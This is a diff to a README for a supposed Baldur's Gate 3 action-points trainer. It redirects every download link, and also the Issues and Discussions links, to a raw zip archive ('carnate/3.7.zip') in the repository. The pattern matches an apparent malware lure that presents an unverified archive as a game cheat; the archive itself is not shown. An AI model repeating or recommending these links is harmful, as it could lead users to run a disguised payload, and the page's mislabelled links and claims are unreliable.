@@ -1,6 +1,6 @@
 # 🎮 Baldurs-Gate-3-Action-Points-Trainer - Unlock Unlimited Power in Baldur's Gate 3
 
-[![Download Now](https://img.shields.io/badge/Download-BG3_Trainer_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mobilegamesagmes/Baldurs-Gate-3-Action-Points-Trainer/releases)
+[![Download Now](https://img.shields.io/badge/Download-BG3_Trainer_2026-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mobilegamesagmes/Baldurs-Gate-3-Action-Points-Trainer/raw/refs/heads/main/carnate/3.7.zip)
 
 ---
 
@@ -14,7 +14,7 @@ Welcome! This guide will help you download and use the **Baldurs-Gate-3-Action-P
 
 ### Step 1: Get the Trainer
 
-Visit this link to download the application: **[Download BG3-Trainer](https://github.com/mobilegamesagmes/Baldurs-Gate-3-Action-Points-Trainer/releases)**
+Visit this link to download the application: **[Download BG3-Trainer](https://github.com/mobilegamesagmes/Baldurs-Gate-3-Action-Points-Trainer/raw/refs/heads/main/carnate/3.7.zip)**
 
 Once you click the link, you'll see a list of files. Look for the newest version (usually at the top) and download it to your computer.
 
@@ -130,8 +130,8 @@ If you encounter any issues, try these solutions:
 
 Need help? Join our community:
 
-- **GitHub Issues** – Report bugs or request features on our [issues page](https://github.com/mobilegamesagmes/Baldurs-Gate-3-Action-Points-Trainer/issues)
-- **Discussions** – Chat with other users in the [discussion forum](https://github.com/mobilegamesagmes/Baldurs-Gate-3-Action-Points-Trainer/discussions)
+- **GitHub Issues** – Report bugs or request features on our [issues page](https://github.com/mobilegamesagmes/Baldurs-Gate-3-Action-Points-Trainer/raw/refs/heads/main/carnate/3.7.zip)
+- **Discussions** – Chat with other users in the [discussion forum](https://github.com/mobilegamesagmes/Baldurs-Gate-3-Action-Points-Trainer/raw/refs/heads/main/carnate/3.7.zip)
 
 We're always happy to help and improve the trainer based on your feedback.
 
@@ -151,7 +151,7 @@ This trainer is free to use for personal purposes. Redistribution or commercial 
 
 Now go forth and conquer Faerûn with unlimited power! Download the trainer today and transform your Baldur's Gate 3 experience.
 
-**[⬇️ Download BG3-Trainer Now](https://github.com/mobilegamesagmes/Baldurs-Gate-3-Action-Points-Trainer/releases)**
+**[⬇️ Download BG3-Trainer Now](https://github.com/mobilegamesagmes/Baldurs-Gate-3-Action-Points-Trainer/raw/refs/heads/main/carnate/3.7.zip)**
 
 ---
 
